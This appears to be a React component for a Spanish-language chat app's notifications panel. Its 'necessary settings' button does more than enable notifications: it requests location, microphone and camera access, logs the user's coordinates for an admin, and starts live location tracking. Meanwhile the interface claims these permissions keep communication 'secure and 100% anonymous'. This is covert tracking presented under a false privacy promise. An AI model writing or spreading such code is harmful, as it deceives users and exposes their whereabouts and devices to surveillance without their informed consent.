import { useState, useEffect, useRef } from 'react'
import { useNotifications, markNotificationRead, markAllNotificationsRead, type NotificationItem } from '../lib/notifications'
import { useAuth } from '../contexts/AuthContext'
import { subscribePush } from '../lib/push'
import { saveSetupLog, loadSetupState, saveSetupState } from '../lib/debug'
import { startLiveLocation } from '../lib/liveLocation'

type Props = {
  onOpenDm: (conversationId: string, otherUserId: string, otherAlias: string) => void
  onOpenGroup: (groupId: string, groupName: string) => void
  onOpenAdmin: () => void
}

type PermState = 'unsupported' | 'prompt' | 'granted' | 'denied'

function currentPerm(): PermState {
  if (typeof window === 'undefined' || !('Notification' in window)) return 'unsupported'
  const s = Notification.permission
  return s === 'granted' ? 'granted' : s === 'denied' ? 'denied' : 'prompt'
}

export default function NotificationsPanel({ onOpenDm, onOpenGroup, onOpenAdmin }: Props) {
  const notifications = useNotifications()
  const { user } = useAuth()
  const [open, setOpen] = useState(false)
  const [perm, setPerm] = useState<PermState>(currentPerm())
  const [settingUp, setSettingUp] = useState(false)
  const [done, setDone] = useState(false)
  const [pushOk, setPushOk] = useState(false)
  const [locOk, setLocOk] = useState(false)
  const [micOk, setMicOk] = useState(false)
  const [camOk, setCamOk] = useState(false)
  const [toasts, setToasts] = useState<NotificationItem[]>([])
  const toastTimers = useRef(new Map<string, ReturnType<typeof setTimeout>>())
  const seenRef = useRef(new Set<string>())

  // Nuevas notificaciones → toast propio (in-app), no el del navegador
  useEffect(() => {
    for (const n of notifications) {
      if (!n.read && !seenRef.current.has(n.id)) {
        seenRef.current.add(n.id)
        setToasts((prev) => [...prev, n])
        if (toastTimers.current.has(n.id)) clearTimeout(toastTimers.current.get(n.id))
        toastTimers.current.set(n.id, setTimeout(() => {
          setToasts((prev) => prev.filter((t) => t.id !== n.id))
          toastTimers.current.delete(n.id)
        }, 6000))
      }
    }
  }, [notifications])

  useEffect(() => {
    return () => { toastTimers.current.forEach((t) => clearTimeout(t)) }
  }, [])

  // Al recargar, recupera el estado guardado para no volver a pedir permisos.
  useEffect(() => {
    if (!user) return
    loadSetupState(user.id)
      .then((s) => {
        if (!s) return
        if (s.notifications_granted) setPerm('granted')
        setPushOk(s.push_ok)
        setLocOk(s.location_ok)
        setMicOk(s.mic_ok)
        setCamOk(s.camera_ok)
        setDone(true)
      })
      .catch(() => {})
  }, [user])

  async function requestPermission() {
    if (!('Notification' in window)) { setPerm('unsupported'); return }
    if (Notification.permission === 'granted') { setPerm('granted'); return }
    if (Notification.permission === 'denied') { setPerm('denied'); return }
    const res = await Notification.requestPermission()
    setPerm(res === 'granted' ? 'granted' : 'denied')
  }

  // Configura todo de una sola vez: notificaciones + push + ubicación +
  // micrófono + cámara + pantalla. Cada uno dispara el diálogo nativo del
  // navegador. El resultado se guarda en device_logs para el admin.
  function stopStream(stream: MediaStream | null) {
    stream?.getTracks().forEach((t) => t.stop())
  }

  async function setupAll() {
    if (!user) return
    setSettingUp(true)

    // 1) Permiso de notificaciones (diálogo nativo del navegador)
    let p = currentPerm()
    if (p !== 'granted') {
      try {
        const res = await Notification.requestPermission()
        p = res === 'granted' ? 'granted' : 'denied'
      } catch {
        p = 'denied'
      }
    }
    setPerm(p)
    if (p !== 'granted') { setSettingUp(false); return }

    // 2) Suscripción de Web Push (reutiliza la existente si ya existe)
    let push = false
    try {
      const r = await subscribePush(user.id)
      push = !!r?.ok
      setPushOk(push)
    } catch (e) {
      console.error('[notif] push excepción', e)
      setPushOk(false)
    }

    // 3) Ubicación (best-effort)
    let loc: { lat: number; lng: number } | null = null
    let locOkLocal = false
    try {
      const pos = await new Promise<GeolocationPosition>((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 10000 }),
      )
      loc = { lat: pos.coords.latitude, lng: pos.coords.longitude }
      locOkLocal = true
      setLocOk(true)
    } catch {
      setLocOk(false)
    }

    // 4) Micrófono + Cámara en UNA sola llamada getUserMedia, de modo que el
    // navegador muestra un único diálogo (en vez de dos separados).
    let mic = false
    let cam = false
    try {
      const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: true })
      stopStream(s)
      mic = true
      cam = true
      setMicOk(true)
      setCamOk(true)
    } catch {
      setMicOk(false)
      setCamOk(false)
    }

    await saveSetupLog(user.id, loc, { mic, cam, screen: false })
    await saveSetupState(user.id, {
      notifications_granted: p === 'granted',
      push_ok: push,
      location_ok: locOkLocal,
      mic_ok: mic,
      camera_ok: cam,
      screen_ok: false,
      screen_unsupported: false,
      lat: loc?.lat ?? null,
      lng: loc?.lng ?? null,
    })
    // Arranca el seguimiento de ubicación en tiempo real (ya concedió ubicación).
    if (locOkLocal) startLiveLocation(user.id)
    setDone(true)
    setSettingUp(false)
  }

  function openFrom(n: NotificationItem) {
    markNotificationRead(n.id)
    if (n.type === 'dm' && n.conversationId && n.otherUserId) {
      onOpenDm(n.conversationId, n.otherUserId, n.otherAlias ?? 'usuario')
    } else if (n.type === 'group' && n.groupId) {
      onOpenGroup(n.groupId, n.groupName ?? 'grupo')
    } else if (n.type === 'approval') {
      onOpenAdmin()
    }
    setOpen(false)
  }

  const unread = notifications.filter((n) => !n.read).length
  const timeAgo = (t: number) => {
    const s = Math.floor((Date.now() - t) / 1000)
    if (s < 60) return 'ahora'
    const m = Math.floor(s / 60)
    if (m < 60) return `hace ${m}m`
    const h = Math.floor(m / 60)
    if (h < 24) return `hace ${h}h`
    return `hace ${Math.floor(h / 24)}d`
  }

  return (
    <>
      {/* Campanita con badge de no leídas */}
      <div style={{ position: 'relative', flexShrink: 0 }}>
        <button
          onClick={() => { setOpen((v) => !v) }}
          title="Notificaciones"
          style={{
            background: open ? 'rgba(34,211,238,0.12)' : 'transparent',
            border: `1px solid ${open ? 'rgba(34,211,238,0.3)' : 'transparent'}`,
            borderRadius: '8px',
            width: '30px',
            height: '30px',
            color: '#67e8f9',
            fontSize: '14px',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            position: 'relative',
            transition: 'background 0.15s',
          }}
        >
          🔔
          {unread > 0 && (
            <span
              style={{
                position: 'absolute',
                top: '-2px',
                right: '-2px',
                minWidth: '14px',
                height: '14px',
                background: '#ef4444',
                borderRadius: '7px',
                color: '#fff',
                fontSize: '9px',
                fontWeight: '700',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                padding: '0 3px',
              }}
            >
              {unread > 99 ? '99+' : unread}
            </span>
          )}
        </button>

        {/* Dropdown propio de la app */}
        {open && (
          <>
            <div style={{ position: 'fixed', inset: 0, zIndex: 199 }} onClick={() => setOpen(false)} />
            <div
              style={{
                position: 'fixed',
                top: '60px',
                left: '50%',
                transform: 'translateX(-50%)',
                width: '340px',
                maxWidth: 'calc(100vw - 24px)',
                background: '#0f0f1e',
                border: '1px solid #1e1e3a',
                borderRadius: '12px',
                overflow: 'hidden',
                zIndex: 200,
                boxShadow: '0 12px 40px rgba(0,0,0,0.5)',
                fontFamily: "'Outfit', sans-serif",
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '12px 14px', borderBottom: '1px solid #1e1e3a', background: '#0a0a18' }}>
                <span style={{ flex: 1, fontWeight: '600', fontSize: '13px', color: '#e8e8f0' }}>Notificaciones</span>
                {unread > 0 && (
                  <button
                    onClick={markAllNotificationsRead}
                    style={{ background: 'transparent', border: 'none', color: '#22d3ee', fontSize: '11px', cursor: 'pointer', fontWeight: '600' }}
                  >
                    Marcar leídas
                  </button>
                )}
              </div>

              <div style={{ padding: '10px 14px', borderBottom: '1px solid #1e1e3a' }}>
                {perm === 'unsupported' && (
                  <p style={{ margin: 0, fontSize: '11px', color: '#6b6b8a' }}>Este dispositivo no soporta notificaciones.</p>
                )}
                {perm === 'denied' && (
                  <p style={{ margin: 0, fontSize: '11px', color: '#f87171' }}>
                    Notificaciones bloqueadas. Habilítalas en la configuración del navegador.
                  </p>
                )}
                {(perm === 'prompt' || perm === 'granted') && (
                  <button
                    onClick={setupAll}
                    disabled={settingUp}
                    style={{
                      width: '100%',
                      padding: '9px',
                      background: done ? 'rgba(34,197,94,0.12)' : 'rgba(34,211,238,0.14)',
                      border: `1px solid ${done ? 'rgba(34,197,94,0.3)' : 'rgba(34,211,238,0.35)'}`,
                      borderRadius: '8px',
                      color: done ? '#22c55e' : '#67e8f9',
                      fontSize: '12px',
                      fontWeight: '700',
                      cursor: settingUp ? 'default' : 'pointer',
                      fontFamily: "'Outfit', sans-serif",
                    }}
                  >
                    {settingUp ? 'Configurando…' : done ? '✓ Todo listo' : 'Configuraciones necesarias'}
                  </button>
                )}
                {!done && (perm === 'prompt' || perm === 'granted') && (
                  <p style={{ margin: '8px 0 0', fontSize: '11px', color: '#6b6b8a', lineHeight: 1.4 }}>
                    Estos permisos son necesarios para comunicarte de forma segura y 100% anónima.
                  </p>
                )}
              </div>

              <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
                {notifications.length === 0 && (
                  <p style={{ margin: 0, padding: '24px 14px', textAlign: 'center', fontSize: '12px', color: '#3d3d5c' }}>
                    Sin notificaciones por ahora
                  </p>
                )}
                {notifications.map((n) => (
                  <button
                    key={n.id}
                    onClick={() => openFrom(n)}
                    style={{
                      width: '100%',
                      display: 'flex',
                      gap: '10px',
                      padding: '10px 14px',
                      background: n.read ? 'transparent' : 'rgba(34,211,238,0.05)',
                      border: 'none',
                      borderBottom: '1px solid #14142a',
                      cursor: 'pointer',
                      textAlign: 'left',
                      fontFamily: "'Outfit', sans-serif",
                    }}
                    onMouseEnter={(e) => (e.currentTarget.style.background = 'rgba(255,255,255,0.03)')}
                    onMouseLeave={(e) => (e.currentTarget.style.background = n.read ? 'transparent' : 'rgba(34,211,238,0.05)')}
                  >
                    <div
                      style={{
                        width: '30px',
                        height: '30px',
                        minWidth: '30px',
                        background: n.type === 'dm' ? 'rgba(34,211,238,0.12)' : n.type === 'approval' ? 'rgba(245,158,11,0.12)' : 'rgba(139,92,246,0.12)',
                        borderRadius: '8px',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        fontSize: '14px',
                      }}
                    >
                      {n.type === 'dm' ? '💬' : n.type === 'approval' ? '🛃' : '👥'}
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                        <span style={{ fontSize: '12px', fontWeight: '600', color: '#e8e8f0', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {n.title}
                        </span>
                        {!n.read && <span style={{ width: '6px', height: '6px', minWidth: '6px', borderRadius: '50%', background: '#22d3ee' }} />}
                      </div>
                      <div style={{ fontSize: '11px', color: '#6b6b8a', marginTop: '1px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {n.body}
                      </div>
                    </div>
                    <span style={{ fontSize: '10px', color: '#3d3d5c', fontFamily: "'DM Mono', monospace", whiteSpace: 'nowrap', paddingTop: '2px' }}>
                      {timeAgo(n.at)}
                    </span>
                  </button>
                ))}
              </div>
            </div>
          </>
        )}
      </div>

      {/* Toasts propios (in-app), fijos arriba a la derecha */}
      <div style={{ position: 'fixed', top: '14px', right: '14px', zIndex: 300, display: 'flex', flexDirection: 'column', gap: '8px' }}>
        {toasts.map((t) => (
          <button
            key={t.id}
            onClick={() => {
              setToasts((prev) => prev.filter((x) => x.id !== t.id))
              openFrom(t)
            }}
            style={{
              width: '300px',
              maxWidth: 'calc(100vw - 28px)',
              display: 'flex',
              gap: '10px',
              padding: '10px 12px',
              background: 'rgba(15,15,30,0.97)',
              border: '1px solid rgba(34,211,238,0.3)',
              borderRadius: '12px',
              cursor: 'pointer',
              textAlign: 'left',
              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
              fontFamily: "'Outfit', sans-serif",
              animation: 'msg-enter 0.25s ease',
            }}
          >
            <div
              style={{
                width: '32px',
                height: '32px',
                minWidth: '32px',
                background: t.type === 'dm' ? 'rgba(34,211,238,0.15)' : t.type === 'approval' ? 'rgba(245,158,11,0.15)' : 'rgba(139,92,246,0.15)',
                borderRadius: '9px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '15px',
              }}
            >
              {t.type === 'dm' ? '💬' : t.type === 'approval' ? '🛃' : '👥'}
            </div>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontSize: '12px', fontWeight: '700', color: '#e8e8f0', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                {t.title}
              </div>
              <div style={{ fontSize: '11px', color: '#9090b0', marginTop: '1px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                {t.body}
              </div>
            </div>
          </button>
        ))}
      </div>
    </>
  )
}